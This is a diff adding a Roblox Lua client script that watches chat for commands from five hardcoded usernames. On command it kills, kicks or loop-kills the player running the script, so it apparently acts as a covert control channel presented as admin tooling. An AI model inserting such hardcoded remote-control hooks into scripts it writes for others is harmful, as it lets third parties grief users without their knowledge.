@@ -1,0 +1,87 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- admins users lower case 
+local authorizedUsers = {
+	["mob_one0"] = true,
+	["nothing_sam00"] = true,
+	["kausarali2"] = true,
+	["cutie143198"] = true,
+	["mobiko00"] = true
+}
+
+local killLoopActive = false
+
+-- 2. Function  kill 
+local function killPlayer()
+	local character = LocalPlayer.Character
+	if character then
+		local humanoid = character:FindFirstChildOfClass("Humanoid")
+		if humanoid then
+			humanoid.Health = 0
+		end
+	end
+end
+
+-- Functions loop kill 
+local function startKillLoop()
+	if killLoopActive then return end
+	killLoopActive = true
+	
+	task.spawn(function()
+		while killLoopActive do
+			killPlayer()
+			task.wait(5)
+		end
+	end)
+end
+
+-- 4. Function chat messages
+local function processMessage(message, sender)
+	-- Check if sender is authorized (converted to lowercase just in case)
+	if not authorizedUsers[string.lower(sender.Name)] then return end
+	
+	
+	local args = {}
+	for word in string.gmatch(message, "%S+") do
+		table.insert(args, string.lower(word)) -- Convert every word to lowercase immediately
+	end
+	
+
+	if #args < 2 then return end
+	
+	local command = args[1]
+	local targetUsername = args[2]
+	
+	
+	if targetUsername ~= string.lower(LocalPlayer.Name) then return end
+	
+	-- commands
+	if command == "!kill" then
+		killPlayer()
+		
+	elseif command == "!kick" then
+		LocalPlayer:Kick("You have been kicked by a server admin.")
+		
+	elseif command == "!killx" then
+		startKillLoop()
+		
+	elseif command == "!stopx" then
+		killLoopActive = false
+	end
+end
+
+-- listen chatting
+local function onPlayerAdded(player)
+	player.Chatted:Connect(function(message)
+		processMessage(message, player)
+	end)
+end
+
+-- Connect 
+for _, player in ipairs(Players:GetPlayers()) do
+	onPlayerAdded(player)
+end
+
+-- Connect future players
+Players.PlayerAdded:Connect(onPlayerAdded)
